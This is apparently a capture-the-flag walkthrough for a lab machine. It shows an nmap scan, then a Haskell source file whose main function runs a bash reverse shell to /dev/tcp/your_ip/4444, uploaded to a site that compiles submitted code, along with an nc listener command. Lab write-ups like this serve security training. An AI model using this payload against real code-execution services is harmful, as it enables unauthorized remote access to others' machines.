# Fun with Functional

## 1. Intel

Scan the target with nmap:

`
nmap -sC -sV <ip>
`

**Output:**

```

Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-16 09:01 +0000
Nmap scan report for 10.10.0.11
Host is up (0.020s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
5001/tcp open  http    Werkzeug httpd 3.1.8 (Python 3.13.5)
|_http-title: FUN with functionnal !
|_http-server-header: Werkzeug/3.1.8 Python/3.13.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Inject

There seems to be a website we could visit

On the website, it's creator prompt us to send a .hs file, telling us the website will compile and correct it.

We can assume there is a compiler on another machine, if it is the case, we would be able to inject a reverse shell

```
hello.hs

module Main where
import System.Process

main = callCommand "/bin/bash -c 'bash -i >& /dev/tcp/your_ip/4444 0>&1'"

```

Before sending , we listen the port on our machine 

```
nc -lvnp 4444
```

We inject the reverse shell through the file and gain access to the host's machine and gain access. Since we search for a user.txt, it is situated in the user's folder.